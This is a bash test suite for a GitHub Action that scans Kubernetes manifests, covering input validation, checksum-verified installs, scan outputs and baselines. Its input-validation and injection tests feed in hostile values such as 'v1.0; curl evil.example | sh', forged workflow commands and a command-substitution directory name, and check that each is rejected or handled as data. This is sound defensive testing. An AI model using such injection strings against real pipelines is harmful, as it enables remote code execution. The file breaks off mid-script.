#!/usr/bin/env bash
# Tests for the GitHub Action (make action-test; CI's action job). Offline:
# curl and go are stubs, releases are local files, and the scan cases run a
# binary built from this tree. Covers:
#   - both action.yml files: no ${{ }} expression inside a run: script, and
#     the same action apart from where run.sh lives;
#   - ci.yml: a change to any file the action job tests triggers that job;
#   - action/run.sh install: input validation, sha256 verification against
#     the release's checksums.txt (fail closed), the go install fallback
#     only with a Go toolchain, and version: preinstalled;
#   - action/run.sh scan: exit codes, outputs, annotations and the step
#     summary on action/testdata, the allow-incomplete, config, baseline
#     and write-baseline inputs, and an injection payload as data;
#   - every run: the log holds no workflow command but run.sh's own, as the
#     runner reads them (leading Unicode whitespace stripped).
set -euo pipefail
cd "$(dirname "$0")/.."

work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
: >"$work/results"
ok() { echo "ok   $1" | tee -a "$work/results"; }
fail() {
  echo "FAIL $1" >&2
  [ -z "${2:-}" ] || sed 's/^/     /' "$2" >&2
  echo "FAIL $1" >>"$work/results"
}

# --- the action.yml files -------------------------------------------------

# Lines of a run: script (the run: line and its block) holding ${{.
for yml in action.yml action/action.yml; do
  bad=$(awk '
    /^ *(- )?run:/ { match($0, /^ */); ind = RLENGTH; inrun = 1; if (index($0, "${{")) print FNR ": " $0; next }
    inrun { match($0, /^ */); if ($0 !~ /^ *$/ && RLENGTH <= ind) inrun = 0 }
    inrun && index($0, "${{") { print FNR ": " $0 }
  ' "$yml")
  if [ -z "$bad" ] && grep -q 'run:' "$yml"; then
    ok "$yml: no \${{ }} expression in a run: script"
  else
    echo "$bad" >"$work/out"
    fail "$yml: \${{ }} expression in a run: script (pass it through env:)" "$work/out"
  fi
done
# Every input reaches run.sh: both steps pass each one as INPUT_<NAME>
# (upper case, - as _), and run.sh reads no INPUT_ variable that is not
# an input.
inputs=$(awk '/^inputs:/ { on = 1; next } on && /^[^ #]/ { on = 0 } on && /^  [a-z-]+:$/ { gsub(/[ :]/, ""); print }' action.yml)
for i in $inputs; do
  var=INPUT_$(tr 'a-z-' 'A-Z_' <<<"$i")
  if [ "$(grep -cxF "        $var: \${{ inputs.$i }}" action.yml)" = 2 ]; then
    ok "action.yml passes input $i to both steps as $var"
  else
    grep -n "$var\|inputs\.$i" action.yml >"$work/out" || true
    fail "action.yml passes input $i to both steps as $var" "$work/out"
  fi
done
# run.sh's install reads the ref the action was used at (ACTION_REF), and
# the repository that ref belongs to (ACTION_REPOSITORY), to default
# version to the ref's release; the empty version default is what tells
# "unset" from an explicit latest.
for yml in action.yml action/action.yml; do
  if [ "$(grep -cxF '        ACTION_REF: ${{ github.action_ref }}' "$yml")" = 1 ] &&
    awk '/^  version:$/ { on = 1; next } on && /^  [a-z-]+:$/ { on = 0 } on && /^    default: ""$/ { found = 1 } END { exit !found }' "$yml"; then
    ok "$yml passes github.action_ref and github.action_repository and leaves version unset by default"
  else
    grep -n 'ACTION_RE\|default:' "$yml" >"$work/out" || true
    fail "$yml passes github.action_ref and github.action_repository and leaves version unset by default" "$work/out"
  fi
done
for var in $(grep -o 'INPUT_[A-Z_]*' action/run.sh | sort -u); do
  if grep -qx "$var" < <(for i in $inputs; do echo "INPUT_$(tr 'a-z-' 'A-Z_' <<<"$i")"; done); then
    ok "run.sh's $var is an input"
  else
    echo "declare it under inputs: in both action.yml files" >"$work/out"
    fail "run.sh's $var is an input" "$work/out"
  fi
done
if diff <(sed 's#\$GITHUB_ACTION_PATH/action/run\.sh#$GITHUB_ACTION_PATH/run.sh#' action.yml) action/action.yml >"$work/out"; then
  ok "action.yml and action/action.yml are the same action"
else
  fail "action.yml and action/action.yml differ beyond the run.sh path" "$work/out"
fi
# On PRs and pushes, CI's action job runs only when the changes job's
# action filter matches; each file the job tests must be in it. The release
# filter gates release-check (GoReleaser snapshot and multi-arch images, up
# to 30 minutes), which tests none of the scan or report code, so the
# action's files stay out of it.
ci=.github/workflows/ci.yml
filter() { awk -v name="$1" '$0 ~ "^ *" name ":$" { on = 1; next } on && !/^ *(- |#)/ { on = 0 } on' "$ci"; }
job() { awk -v name="$1" '$0 == "  " name ":" { on = 1; next } on && /^  [^ ]/ { on = 0 } on' "$ci"; }
action_filter=$(filter action) release_filter=$(filter release)
# The binary's own inputs come from the package graph, not a hand copy: a
# change in any package it links (or the data embedded in one) changes what
# the action job checks.
mod=$(go list -m)
built_from=$(go list -deps -f '{{if not .Standard}}{{.ImportPath}}{{end}}' ./cmd/upgradescope |
  sed -n "s|^$mod/||p" | cut -d/ -f1 | sort -u | sed 's|$|/**|')
set -f # the patterns are literal filter entries, not globs to expand
for f in action.yml 'action/**' hack/action_test.sh "$ci" Makefile go.mod go.sum $built_from; do
  if grep -qxF "              - '$f'" <<<"$action_filter"; then
    ok "ci.yml's action filter runs the action job on $f"
  else
    echo "add '$f' to the changes job's action filter in $ci" >"$work/out"
    fail "ci.yml's action filter runs the action job on $f" "$work/out"
  fi
done
set +f
if grep -qE '^      action: \$\{\{ steps\.[a-z]+\.outputs\.action \}\}$' <<<"$(job changes)" &&
  grep -qF "needs.changes.outputs.action == 'true'" <<<"$(job action)"; then
  ok "the action job runs on the changes job's action output"
else
  job action >"$work/out"
  fail "the action job runs on the changes job's action output" "$work/out"
fi
if [ -n "$release_filter" ] && ! grep -E "internal/|'action\.yml'|'action/\*\*'|action_test" <<<"$release_filter" >"$work/out"; then
  ok "ci.yml's release filter leaves the action's files to the action filter"
else
  fail "ci.yml's release filter leaves the action's files to the action filter" "$work/out"
fi

# --- stubs ----------------------------------------------------------------

# A sandbox PATH with the tools run.sh uses and no go; stub dirs are put in
# front of it per case.
mkdir -p "$work/sys"
for t in bash sh env cat chmod cp mkdir mktemp rm tar gzip awk sed grep head tr uname jq sha256sum shasum perl; do
  p=$(command -v "$t" || true)
  [ -z "$p" ] || ln -s "$p" "$work/sys/$t"
done

releases=https://github.com/abd-ulbasit/upgradescope/releases
os=$(uname -s | tr '[:upper:]' '[:lower:]')
case "$(uname -m)" in x86_64 | amd64) arch=amd64 ;; *) arch=arm64 ;; esac
asset="upgradescope_${os}_${arch}.tar.gz"

# curl: serves $releases/download/<tag>/<file> from $work/rel/<tag>/<file>
# and redirects $releases/latest to $STUB_LATEST; logs every URL.
mkdir -p "$work/stub-curl"
cat >"$work/stub-curl/curl" <<EOF
#!/usr/bin/env bash
out= fmt= url=
while [ \$# -gt 0 ]; do
  case \$1 in -o) out=\$2; shift ;; -w) fmt=\$2; shift ;; -*) ;; *) url=\$1 ;; esac
  shift
done
echo "curl \$url" >>"$work/calls"
case \$url in
  "$releases/latest")
    [ -n "\${STUB_LATEST:-}" ] || exit 22
    [ "\$fmt" != '%{url_effective}' ] || printf '%s' "$releases/tag/\$STUB_LATEST" ;;
  "$releases/download/"*)
    f="$work/rel/\${url#"$releases/download/"}"
    [ -f "\$f" ] || exit 22
    cp "\$f" "\$out" ;;
  *) exit 6 ;;
esac
EOF
# go: "builds" a stub upgradescope into $work/gobin.
mkdir -p "$work/stub-go"
cat >"$work/stub-go/go" <<EOF
#!/usr/bin/env bash
echo "go \$*" >>"$work/calls"
case "\$1 \${2:-}" in
  "env GOBIN") echo "$work/gobin" ;;
  install*) mkdir -p "$work/gobin" && printf '#!/bin/sh\necho built from source\n' >"$work/gobin/upgradescope" && chmod +x "$work/gobin/upgradescope" ;;
esac
EOF
chmod +x "$work/stub-curl/curl" "$work/stub-go/go"

# release <tag> <checksums-mode: ok|bad|missing|none> [no-archive]
release() {
  local d="$work/rel/$1"
  mkdir -p "$d" "$work/pkg"
  # --version prints a block since v0.2.0; the log keeps its first line.
  printf '#!/bin/sh\nprintf "upgradescope %s\\n  commit:        0000000\\n"\n' "$1" >"$work/pkg/upgradescope"
  chmod +x "$work/pkg/upgradescope"
  [ "${3:-}" = no-archive ] || tar -czf "$d/$asset" -C "$work/pkg" upgradescope
  case $2 in
    ok) (cd "$d" && { sha256sum "$asset" 2>/dev/null || shasum -a 256 "$asset"; }) >"$d/checksums.txt" ;;
    bad) echo "0000000000000000000000000000000000000000000000000000000000000000  $asset" >"$d/checksums.txt" ;;
    missing) echo "0000000000000000000000000000000000000000000000000000000000000000  upgradescope_plan9_amd64.tar.gz" >"$d/checksums.txt" ;;
    none) ;;
  esac
}
release v9.9.9 ok
release v9.9.8 bad
release v9.9.7 missing
release v9.9.6 none no-archive
release v9.9.5 none
release v9.9.4 ok
release v9.9.9-rc.1 ok

# The real binary, for the scan cases.
mkdir -p "$work/real"
go build -o "$work/real/upgradescope" ./cmd/upgradescope

# run <cmd> <path-prefix> [env...]: action/run.sh <cmd> as a step of a fresh
# job; output in $work/out, the step's runner files in $rt, RUNNER_TEMP in
# $tmp. With same_job=1, a later step of the last run's job: its own runner
# files, the same RUNNER_TEMP.
run() {
  local cmd=$1 prefix=$2
  shift 2
  rt="$work/rt$((++n))"
  [ -n "${same_job:-}" ] || tmp="$rt/tmp"
  mkdir -p "$rt" "$tmp"
  : >"$rt/output" && : >"$rt/path" && : >"$rt/summary" && : >"$work/calls"
  code=0
  env -i HOME="$HOME" PATH="$prefix$work/sys" RUNNER_TEMP="$tmp" \
    GITHUB_OUTPUT="$rt/output" GITHUB_PATH="$rt/path" GITHUB_STEP_SUMMARY="$rt/summary" \
    INPUT_PATH=action/testdata/removed INPUT_TARGET=1.36 INPUT_FAIL_ON=blocker INPUT_VERSION=v9.9.9 \
    "$@" bash action/run.sh "$cmd" >"$work/out" 2>&1 || code=$?
  forged "$work/out" | sed "s/^/run $n ($cmd): /" >>"$work/forged"
}
n=0
: >"$work/forged"
# forged <file>: each line of the log that the runner would read as a
# workflow command but that is not one run.sh writes. The runner splits the
# log at line breaks, strips all leading Unicode whitespace (.NET's
# TrimStart: \f, \v, U+0085, U+00A0, U+2000-U+200A, U+3000 and the rest, not
# only space and tab) and reads a line that then starts with :: as a
# command. run.sh's own commands start at the line's first character and
# are ::error or ::warning, with properties only from annotations(), whose
# values have : and , escaped.
forged() {
  perl -CSD -0777 -ne '
    for (split /\r\n|\r|\n/) {
      (my $t = $_) =~ s/^\p{White_Space}+//;
      next unless $t =~ /^::/;
      next if $t eq $_ && /^::(?:error|warning)(?: (?:file=[^:,]*,line=\d+,)?title=upgradescope (?:blocker|warning) \([^:,]*\))?::/;
      print "$_\n";
    }' "$1"
}
# expect <name> <want-exit> <want-substring>: checks the last run.
expect() {
  if [ "$code" = "$2" ] && grep -qF -- "$3" "$work/out"; then ok "$1"; else
    echo "(exit $code, want $2 and '$3')" >>"$work/out"
    fail "$1" "$work/out"
  fi
}
# output <name>: the last run's step output <name>.
output() { sed -n "s/^$1=//p" "$rt/output" | tail -n 1; }
# has <name> <file> <substring>
has() { if grep -qF -- "$3" "$2"; then ok "$1"; else fail "$1" "$2"; fi; }
hasnt() { if grep -qF -- "$3" "$2"; then fail "$1" "$2"; else ok "$1"; fi; }

# --- input validation -----------------------------------------------------

run install "$work/stub-curl:" INPUT_VERSION='v1.0; curl evil.example | sh'
expect "invalid version is rejected" 1 "invalid version 'v1.0; curl evil.example | sh'"
hasnt "invalid version downloads nothing" "$work/calls" curl
run install "$work/stub-curl:" INPUT_FAIL_ON=error
expect "invalid fail-on is rejected" 1 "invalid fail-on 'error' (want blocker, warning or never)"
run install "$work/stub-curl:" INPUT_TARGET=latest
expect "invalid target is rejected" 1 "invalid target 'latest'"
run install "$work/stub-curl:" INPUT_ALLOW_INCOMPLETE='true; touch pwned'
expect "invalid allow-incomplete is rejected" 1 "invalid allow-incomplete 'true; touch pwned' (want true or false)"
hasnt "invalid allow-incomplete downloads nothing" "$work/calls" curl
run install "$work/stub-curl:" INPUT_ALLOW_INCOMPLETE=yes
expect "allow-incomplete takes only true or false" 1 "invalid allow-incomplete 'yes' (want true or false)"
run install "$work/stub-curl:" INPUT_PATH=does/not/exist
expect "missing path is rejected" 1 "path 'does/not/exist' does not exist"
run install "$work/stub-curl:" INPUT_PATH=
expect "empty path is rejected" 1 "path is required"
run install "$work/stub-curl:" INPUT_CONFIG=no/such/.upgradescope.yaml
expect "a missing config file is rejected" 1 "config 'no/such/.upgradescope.yaml' is not a file"
hasnt "a missing config file downloads nothing" "$work/calls" curl
run install "$work/stub-curl:" INPUT_CONFIG=action/testdata
expect "a directory as config is rejected" 1 "config 'action/testdata' is not a file"
run install "$work/stub-curl:" INPUT_BASELINE=no/such/report.json
expect "a missing baseline is rejected" 1 "baseline 'no/such/report.json' is not a file"
run install "$work/stub-curl:" INPUT_WRITE_BASELINE=no/such/dir/report.json
expect "write-baseline into a missing directory is rejected" 1 "write-baseline 'no/such/dir/report.json': directory 'no/such/dir' does not exist"
run install "$work/stub-curl:" INPUT_WRITE_BASELINE=action/testdata
expect "a directory as write-baseline is rejected" 1 "write-baseline 'action/testdata' is a directory"

# A value that reaches the log must not start a workflow command of its own
# (#197 AC-05b): its line breaks and % are escaped, so the only line that
# starts with :: is die()'s own ::error. Every input that die() echoes.
nl=$'\n'
for pair in \
  "INPUT_VERSION=v1.0.0${nl}::warning title=FORGED::x" \
  "INPUT_TARGET=1.36${nl}::warning title=FORGED::x" \
  "INPUT_FAIL_ON=never${nl}::add-mask::upgradescope" \
  "INPUT_ALLOW_INCOMPLETE=true${nl}::notice::x" \
  "INPUT_PATH=action/testdata/removed${nl}::error title=FORGED-PATH::x" \
  "INPUT_CONFIG=ci/x.yaml${nl}::notice::x" \
  "INPUT_BASELINE=ci/x.json${nl}::notice::x" \
  "INPUT_WRITE_BASELINE=ci/${nl}::notice::x/y.json"; do
  var=${pair%%=*}
  run install "$work/stub-curl:" "$pair"
  if [ "$code" = 1 ] && [ "$(grep -c '^::' "$work/out")" = 1 ] && grep -q '^::error::upgradescope action: ' "$work/out" &&
    grep -qF '%0A::' "$work/out"; then ok "a line break in $var cannot start a workflow command"; else
    fail "a line break in $var cannot start a workflow command" "$work/out"
  fi
done
run install "$work/stub-curl:" INPUT_TARGET=$'1.36\r::warning::x'
if [ "$(grep -c '^::' "$work/out")" = 1 ] && grep -qF '%0D::warning::x' "$work/out"; then ok "a CR in an input cannot start a workflow command"; else
  fail "a CR in an input cannot start a workflow command" "$work/out"
fi
# % is escaped too, so an input cannot spell %0A for the runner to decode.
run install "$work/stub-curl:" INPUT_TARGET='1.36%0A::set-output name=x::y'
expect "a % in an input is escaped, not decoded by the runner" 1 "invalid target '1.36%250A::set-output name=x::y'"
hasnt "no GITHUB_OUTPUT write for a bad input" "$rt/output" "x="

# --- install ----------------------------------------------------------------

# With no version, an action at a release tag runs that release (#197
# AC-03b): GitHub's latest skips prereleases, so @v0.2.0-rc.2 would
# otherwise run an older stable release's engine and pass what it blocks.
run install "$work/stub-curl:" INPUT_VERSION= ACTION_REF=v9.9.9 STUB_LATEST=v9.9.4
expect "no version at a release tag ref installs that tag" 0 "installed upgradescope v9.9.9 from $releases/download/v9.9.9/$asset"
has "the default version is logged" "$work/out" "version defaults to the action ref v9.9.9"
hasnt "no version at a tag ref does not ask for the latest release" "$work/calls" "$releases/latest"
run install "$work/stub-curl:" INPUT_VERSION= ACTION_REF=v9.9.9-rc.1 STUB_LATEST=v9.9.4
expect "no version at a release candidate tag ref installs that tag" 0 "installed upgradescope v9.9.9-rc.1 from $releases/download/v9.9.9-rc.1/$asset"
run install "$work/stub-curl:" INPUT_VERSION=v9.9.9 ACTION_REF=v9.9.9-rc.1
expect "an explicit version wins over the ref" 0 "installed upgradescope v9.9.9 from $releases/download/v9.9.9/$asset"
for ref in main v0 v9.9 0123456789abcdef0123456789abcdef01234567 v9.9.9-beta.1 "v9.9.9${nl}::x"; do
  run install "$work/stub-curl:" INPUT_VERSION= ACTION_REF="$ref" STUB_LATEST=v9.9.4
  expect "no version at ref ${ref%%$nl*} installs the latest release" 0 "latest release is v9.9.4"
  hasnt "no version at ref ${ref%%$nl*} is not read as a tag" "$work/out" "defaults to the action ref"
done
run install "$work/stub-curl:" INPUT_VERSION= STUB_LATEST=v9.9.4
expect "no version and no ref installs the latest release" 0 "latest release is v9.9.4"
# An explicit latest at a tag ref still floats, and says when that is
# older than the ref's own release.
run install "$work/stub-curl:" INPUT_VERSION=latest ACTION_REF=v9.9.9-rc.1 STUB_LATEST=v9.9.4
expect "latest older than the ref's release warns" 0 "::warning::version latest is v9.9.4, older than this action's own release v9.9.9-rc.1"
run install "$work/stub-curl:" INPUT_VERSION=latest ACTION_REF=v9.9.9 STUB_LATEST=v9.9.9-rc.1
expect "a release candidate is older than its release" 0 "::warning::version latest is v9.9.9-rc.1, older than this action's own release v9.9.9"
run install "$work/stub-curl:" INPUT_VERSION=latest ACTION_REF=v9.9.9-rc.1 STUB_LATEST=v9.9.9
if grep -q '^::warning' "$work/out"; then fail "latest newer than the ref's release does not warn" "$work/out"; else ok "latest newer than the ref's release does not warn"; fi
run install "$work/stub-curl:" INPUT_VERSION=latest ACTION_REF=v9.9.9 STUB_LATEST=v9.9.9
if grep -q '^::warning' "$work/out"; then fail "latest equal to the ref's release does not warn" "$work/out"; else ok "latest equal to the ref's release does not warn"; fi
run install "$work/stub-curl:" INPUT_VERSION=latest ACTION_REF=main STUB_LATEST=v9.9.4
if grep -q '^::warning' "$work/out"; then fail "a branch ref has no release to compare with" "$work/out"; else ok "a branch ref has no release to compare with"; fi

run install "$work/stub-curl:"
expect "release install verifies the checksum" 0 "sha256 OK: $asset"
has "release install logs the version on one line" "$work/out" "installed upgradescope v9.9.9 from $releases/download/v9.9.9/$asset"
hasnt "release install logs only the first --version line" "$work/out" "commit:"
has "release install puts the binary on GITHUB_PATH" "$rt/path" "$tmp/upgradescope-bin"
[ -x "$tmp/upgradescope-bin/upgradescope" ] && ok "release install extracts the binary" ||
  fail "release install extracts the binary" "$work/out"

run install "$work/stub-curl:" INPUT_VERSION=latest STUB_LATEST=v9.9.9
expect "latest resolves to the newest release tag" 0 "latest release is v9.9.9"
has "latest downloads the resolved tag" "$work/calls" "$releases/download/v9.9.9/checksums.txt"

run install "$work/stub-curl:$work/stub-go:" INPUT_VERSION=v9.9.8
expect "checksum mismatch fails closed" 1 "sha256 mismatch for $asset"
[ ! -e "$tmp/upgradescope-bin/upgradescope" ] && [ ! -s "$rt/path" ] && ok "checksum mismatch installs nothing" ||
  fail "checksum mismatch installs nothing" "$work/out"
hasnt "checksum mismatch does not fall back to go install" "$work/calls" "go install"

run install "$work/stub-curl:" INPUT_VERSION=v9.9.7
expect "an archive missing from checksums.txt fails" 1 "checksums.txt for v9.9.7 has no entry for $asset"
run install "$work/stub-curl:" INPUT_VERSION=v9.9.5
expect "a release without checksums.txt fails" 1 "cannot download checksums.txt for v9.9.5"

run install "$work/stub-curl:" INPUT_VERSION=v9.9.6
expect "no archive and no Go toolchain fails clearly" 1 "no Go toolchain to build it from source"
run install "$work/stub-curl:$work/stub-go:" INPUT_VERSION=v9.9.6
expect "no archive falls back to go install with Go present" 0 "falling back to go install"
has "go install builds the requested version" "$work/calls" "go install github.com/abd-ulbasit/upgradescope/cmd/upgradescope@v9.9.6"
has "go install puts GOBIN on GITHUB_PATH" "$rt/path" "$work/gobin"
run install "$work/stub-curl:$work/stub-go:" INPUT_VERSION=latest
expect "unresolvable latest falls back to go install" 0 "falling back to go install"
has "go install builds @latest" "$work/calls" "cmd/upgradescope@latest"

run install "$work/real:$work/stub-curl:" INPUT_VERSION=preinstalled
expect "preinstalled uses the binary on PATH" 0 "using $work/real/upgradescope: upgradescope "
hasnt "preinstalled logs only the first --version line" "$work/out" "registry date:"
hasnt "preinstalled downloads nothing" "$work/calls" curl
run install "$work/stub-curl:" INPUT_VERSION=preinstalled
expect "preinstalled without a binary fails" 1 "no upgradescope on PATH"

# --- scan -------------------------------------------------------------------

run scan "$work/real:"
expect "removed APIs fail the gate with exit 2" 2 "readiness gate failed"
sarif=$(output sarif-file) report=$(output report-json)
case $sarif in "$tmp"/*.sarif) ok "sarif-file output is under RUNNER_TEMP" ;; *) fail "sarif-file output is under RUNNER_TEMP" "$rt/output" ;; esac
jq -e '.runs[0].results | length == 2' "$sarif" >/dev/null &&
  ok "SARIF is complete when the gate fails" || fail "SARIF is complete when the gate fails" "$rt/output"
jq -e '.findings | length == 2' "$report" >/dev/null &&
  ok "report-json output is the JSON report" || fail "report-json output is the JSON report" "$rt/output"
for kv in verdict=blocked score=50 ready=false blockers=2 warnings=0 suppressed=0 new-blockers=2 new-warnings=0; do
  has "output $kv" "$rt/output" "$kv"
done
summary=$(output summary-file)
case $summary in "$tmp"/*.md) ok "summary-file output is under RUNNER_TEMP" ;; *) fail "summary-file output is under RUNNER_TEMP" "$rt/output" ;; esac
cmp -s "$summary" "$rt/summary" && ok "summary-file holds the step summary" || fail "summary-file holds the step summary" "$rt/output"
has "summary has the findings table" "$rt/summary" "| blocker | networking.k8s.io/v1beta1 Ingress removed in 1.22 (1 object) | \`action/testdata/removed/all.yaml:2\` shop/web | migrate to networking.k8s.io/v1 Ingress |"
has "summary header" "$rt/summary" "### upgradescope: blocked"
has "log lists every blocker with its fix" "$work/out" "batch/v1beta1 CronJob removed in 1.25 (1 object) | \`action/testdata/removed/all.yaml:12\` nightly | migrate to batch/v1 CronJob"
has "blocker annotation with file and line" "$work/out" "::error file=action/testdata/removed/all.yaml,line=2,title=upgradescope blocker (removed-api)::networking.k8s.io/v1beta1 Ingress removed in 1.22 (1 object). Fix: migrate to networking.k8s.io/v1 Ingress"

run scan "$work/real:" INPUT_PATH=action/testdata/clean
expect "clean manifests pass the gate" 0 "### upgradescope: ready"
for kv in verdict=ready score=100 ready=true blockers=0 warnings=0; do has "clean output $kv" "$rt/output" "$kv"; done
has "clean summary is written" "$rt/summary" "No findings."

# Two uses of the action in one job (CI's action job: removed, then clean,
# then checks on removed's files) share RUNNER_TEMP; the second must not
# overwrite the first one's reports.
run scan "$work/real:"
sarif=$(output sarif-file) report=$(output report-json)
same_job=1 run scan "$work/real:" INPUT_PATH=action/testdata/clean
expect "a second scan in the same job runs" 0 "### upgradescope: ready"
[ "$(output sarif-file)" != "$sarif" ] && [ "$(output report-json)" != "$report" ] &&
  ok "each scan in a job writes its own report files" || fail "each scan in a job writes its own report files" "$rt/output"
jq -e '.runs[0].results | length == 2' "$sarif" >/dev/null &&
  ok "a later scan in the job leaves the first sarif-file intact" || fail "a later scan in the job leaves the first sarif-file intact" "$sarif"
jq -e '.findings | length == 2' "$report" >/dev/null &&
  ok "a later scan in the job leaves the first report-json intact" || fail "a later scan in the job leaves the first report-json intact" "$report"

run scan "$work/real:" INPUT_FAIL_ON=never
expect "fail-on never passes with blockers" 0 "### upgradescope: blocked"
# ::error marks the findings that fail the gate; with fail-on never, none.
has "fail-on never annotates a blocker as a warning" "$work/out" "::warning file=action/testdata/removed/all.yaml,line=2,title=upgradescope blocker (removed-api)::"
if grep -q '^::error' "$work/out"; then fail "fail-on never emits no ::error" "$work/out"; else ok "fail-on never emits no ::error"; fi

# --- allow-incomplete ---------------------------------------------------------

# A target one minor past the knowledge base's horizon: no blocker, but
# kb-coverage was not assessed, so the verdict is unknown and the gate
# fails, unless allow-incomplete: true passes --allow-incomplete to the
# gate pass (the JSON and Markdown passes run with --fail-on never, where
# it changes nothing). A spy logs each upgradescope call into $work/calls.
horizon=$("$work/real/upgradescope" version --output json | jq -r .kbHorizon)
past="1.$((${horizon#1.} + 1))"
mkdir -p "$work/spy"
cat >"$work/spy/upgradescope" <<EOF
#!/usr/bin/env bash
echo "upgradescope \$*" >>"$work/calls"
exec "$work/real/upgradescope" "\$@"
EOF
chmod +x "$work/spy/upgradescope"
run scan "$work/spy:" INPUT_PATH=action/testdata/clean INPUT_TARGET="$past"
expect "a target past the KB horizon ($past) fails the gate as unknown" 2 "### upgradescope: unknown"
has "past the horizon sets verdict=unknown" "$rt/output" "verdict=unknown"
hasnt "without allow-incomplete, --allow-incomplete is not passed" "$work/calls" "--allow-incomplete"
run scan "$work/spy:" INPUT_PATH=action/testdata/clean INPUT_TARGET="$past" INPUT_ALLOW_INCOMPLETE=false
expect "allow-incomplete: false still fails an unknown verdict" 2 "### upgradescope: unknown"
hasnt "allow-incomplete: false passes no --allow-incomplete" "$work/calls" "--allow-incomplete"
run scan "$work/spy:" INPUT_PATH=action/testdata/clean INPUT_TARGET="$past" INPUT_ALLOW_INCOMPLETE=true
expect "allow-incomplete: true passes an unknown verdict" 0 "### upgradescope: unknown"
has "allow-incomplete: true is passed through as --allow-incomplete" "$work/calls" "--output sarif --fail-on=blocker --allow-incomplete"
has "allow-incomplete: true keeps verdict=unknown" "$rt/output" "verdict=unknown"
run scan "$work/spy:" INPUT_ALLOW_INCOMPLETE=true
expect "allow-incomplete: true still fails on blockers" 2 "readiness gate failed"

# --- config, baseline and write-baseline -------------------------------------

# An ignore rule per removed API: the gate passes, and the summary says
# why (every finding suppressed, each with its reason and the config file).
run scan "$work/real:" INPUT_CONFIG=action/testdata/ignore-removed.yaml
expect "ignore rules for every blocker pass the gate" 0 "### upgradescope: ready"
for kv in verdict=ready ready=true score=100 blockers=0 suppressed=2 new-blockers=0; do
  has "suppressed output $kv" "$rt/output" "$kv"
done
has "the summary says nothing is left after suppression" "$rt/summary" "No findings left after suppression."
has "the summary counts the suppressed findings" "$rt/summary" "**Suppressed (2).**"
has "the summary gives each suppression's reason and config file" "$rt/summary" "| blocker | networking.k8s.io/v1beta1 Ingress removed in 1.22 (1 object) | \`action/testdata/removed/all.yaml:2\` shop/web | shop's legacy Ingress is replaced before the upgrade (test fixture) | \`action/testdata/ignore-removed.yaml\` |"
if grep -q '^::\(error\|warning\) ' "$work/out"; then fail "suppressed findings are not annotated" "$work/out"; else ok "suppressed findings are not annotated"; fi
jq -e '.runs[0].results | length == 2 and all(.[]; .suppressions[0].justification != null)' "$(output sarif-file)" >/dev/null &&
  ok "the SARIF keeps suppressed results with their justification" || fail "the SARIF keeps suppressed results with their justification" "$(output sarif-file)"

# A baseline holding only the CronJob: the Ingress is new and fails the
# gate; the CronJob is marked unchanged, annotated as a warning only.
run scan "$work/real:" INPUT_BASELINE=action/testdata/baseline-cronjob.json
expect "a new blocker against the baseline fails the gate" 2 "readiness gate failed"
for kv in verdict=blocked blockers=2 new-blockers=1 new-warnings=0; do
  has "baseline output $kv" "$rt/output" "$kv"
done
has "the summary counts new and unchanged findings" "$rt/summary" "**Baseline:** 1 new, 1 unchanged. Only new findings fail the gate"
has "the summary marks the new finding" "$rt/summary" "| blocker | **new** | networking.k8s.io/v1beta1 Ingress removed in 1.22"
has "the summary marks the unchanged finding" "$rt/summary" "| blocker | unchanged | batch/v1beta1 CronJob removed in 1.25"
has "the new blocker is an error annotation" "$work/out" "::error file=action/testdata/removed/all.yaml,line=2,title=upgradescope blocker (removed-api)::networking.k8s.io/v1beta1 Ingress"
has "a blocker in the baseline is a warning annotation" "$work/out" "::warning file=action/testdata/removed/all.yaml,line=12,title=upgradescope blocker (removed-api%2C in baseline)::batch/v1beta1 CronJob"

# write-baseline, then that file as the baseline: nothing is new, so the
# gate passes though both blockers (and the blocked verdict) remain.
run scan "$work/real:" INPUT_FAIL_ON=never INPUT_WRITE_BASELINE="$work/baseline.json"
expect "write-baseline runs" 0 "### upgradescope: blocked"
jq -e '.schemaVersion and (.findings | length == 2)' "$work/baseline.json" >/dev/null &&
  ok "write-baseline writes the JSON report" || fail "write-baseline writes the JSON report" "$work/out"
run scan "$work/real:" INPUT_BASELINE="$work/baseline.json"
expect "nothing new against the baseline passes the gate" 0 "**Baseline:** 0 new, 2 unchanged."
for kv in verdict=blocked blockers=2 new-blockers=0; do
  has "rebaselined output $kv" "$rt/output" "$kv"
done
if grep -q '^::error' "$work/out"; then fail "nothing new emits no ::error" "$work/out"; else ok "nothing new emits no ::error"; fi

# baseline and write-baseline naming one file: every pass of the scan
# compares with the old baseline, and the file ends up as the new one.
cp action/testdata/baseline-cronjob.json "$work/rolling.json"
run scan "$work/real:" INPUT_BASELINE="$work/rolling.json" INPUT_WRITE_BASELINE="$work/rolling.json"
expect "a rolling baseline gates on the old one" 2 "**Baseline:** 1 new, 1 unchanged."
has "a rolling baseline's outputs use the old one" "$rt/output" "new-blockers=1"
jq -e '.findings | length == 2' "$work/rolling.json" >/dev/null &&
  ok "a rolling baseline is replaced by this scan's report" || fail "a rolling baseline is replaced by this scan's report" "$work/rolling.json"

# The audit's payload, and a command substitution, as a directory name.
payload="$work/x\" ; echo INJECTED-COMMAND-RAN ; touch $work/pwned ; echo \"\$(touch $work/pwned2)"
mkdir -p "$payload" && cp action/testdata/clean/all.yaml "$payload/"
cp action/testdata/ignore-removed.yaml action/testdata/baseline-cronjob.json "$payload/"
run scan "$work/real:" INPUT_PATH="$payload" INPUT_CONFIG="$payload/ignore-removed.yaml" \
  INPUT_BASELINE="$payload/baseline-cronjob.json" INPUT_WRITE_BASELINE="$payload/new-baseline.json"
expect "an injection payload in path is scanned as a path" 0 "### upgradescope: ready"
[ -f "$payload/new-baseline.json" ] && ok "an injection payload in write-baseline is written as a path" ||
  fail "an injection payload in write-baseline is written as a path" "$work/out"
[ ! -e "$work/pwned" ] && [ ! -e "$work/pwned2" ] && ! grep -qx INJECTED-COMMAND-RAN "$work/out" &&
  ok "the injection payload did not run" || fail "the injection payload did not run" "$work/out"

# A v0.1.x release (what version: latest resolves to until v0.2.0 ships):
# no --output markdown, and JSON in the v0.1.1 Report shape, without
# verdict, filesBase or finding objects. The gate and every output still
# work. STUB_REPORT replaces the jq filter that reshapes the JSON.
mkdir -p "$work/old"
cat >"$work/old/upgradescope" <<EOF
#!/usr/bin/env bash
case "\$*" in
  *"--output markdown"*) echo 'invalid --output "markdown" (want table, json, or sarif)' >&2; exit 1 ;;
  *"--output json"*)
    "$work/real/upgradescope" "\$@" | jq "\${STUB_REPORT:-del(.verdict, .filesBase) | .findings |= map(del(.objects))}" ;;
